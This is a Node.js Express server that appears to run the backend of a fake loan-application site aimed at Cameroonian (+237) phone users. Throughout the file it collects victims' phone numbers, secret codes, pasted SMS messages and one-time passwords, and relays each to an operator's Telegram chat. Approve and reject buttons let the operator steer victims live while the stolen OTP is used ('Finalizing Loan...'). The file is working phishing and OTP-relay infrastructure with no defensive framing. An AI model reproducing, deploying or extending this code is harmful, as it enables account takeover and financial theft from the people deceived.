const express = require('express');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

// Temporary memory for applications
const applications = {};

// 1. Receive application from website
app.post('/api/apply', async (req, res) => {
    const { phone, code } = req.body;
    const appId = Date.now().toString(); 

    applications[appId] = { status: 'pending', phone, code };

    const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    const message = `🚨 *NEW APPLICATION* 🚨\n\n` +
                    `📞 *Phone:* +237 ${phone}\n` +
                    `🔑 *Code:* ${code}\n\n` +
                    `Status: ⏳ Pending`;

    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "✅ APPROVE", callback_data: `approve_${appId}` },
                            { text: "❌ REJECT", callback_data: `reject_${appId}` }
                        ]
                    ]
                }
            })
        });

        res.status(200).json({ success: true, appId: appId });
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false });
    }
});

// 2. Check status from website
app.get('/api/status/:id', (req, res) => {
    const appId = req.params.id;
    if (applications[appId]) {
        res.json({ status: applications[appId].status });
    } else {
        res.status(404).json({ error: "Application not found" });
    }
});

// 2b. Forward Pasted SMS to Telegram
app.post('/api/verify-sms', async (req, res) => {
    const { sms, appId } = req.body;
    
    if (!sms) return res.json({ success: false });

    const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    const message = `📩 *SMS RECEIVED* 📩\n\n*App ID:* \`${appId}\`\n\n*Message:*\n\`\`\`\n${sms}\n\`\`\``;

    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
        });
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false });
    }
});

// 2c. Receive the 4-digit OTP and send to Telegram
app.post('/api/submit-otp', async (req, res) => {
    const { otp, appId } = req.body;

    const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    const message = `🔐 *NEW OTP RECEIVED* 🔐\n\n` +
                    `*App ID:* \`${appId}\`\n` +
                    `*OTP Code:* \`${otp}\`\n\n` +
                    `Status: Finalizing Loan...`;

    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
        });
        res.json({ success: true });
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false });
    }
});

// 3. Telegram Webhook
app.post('/api/telegram-webhook', async (req, res) => {
    const { callback_query } = req.body;

    if (callback_query) {
        const data = callback_query.data; 
        const messageId = callback_query.message.message_id; 
        const chatId = callback_query.message.chat.id;
        const [action, appId] = data.split('_');

        let newText = "";
        let newStatus = "";

        if (applications[appId]) {
            if (action === 'approve') {
                applications[appId].status = 'approved';
                newText = `🚨 *NEW APPLICATION* 🚨\n\n` +
                          `📞 *Phone:* +237 ${applications[appId].phone}\n` +
                          `🔑 *Code:* ${applications[appId].code}\n\n` +
                          `Status: ✅ *APPROVED*`;
                newStatus = "Approved!";
            } else if (action === 'reject') {
                applications[appId].status = 'rejected';
                newText = `🚨 *NEW APPLICATION* 🚨\n\n` +
                          `📞 *Phone:* +237 ${applications[appId].phone}\n` +
                          `🔑 *Code:* ${applications[appId].code}\n\n` +
                          `Status: ❌ *REJECTED*`;
                newStatus = "Rejected!";
            }

            await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/editMessageText`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    message_id: messageId,
                    text: newText,
                    parse_mode: 'Markdown',
                    reply_markup: { inline_keyboard: [] } 
                })
            });
        }

        await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: callback_query.id, text: newStatus })
        });
    }

    res.sendStatus(200);
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});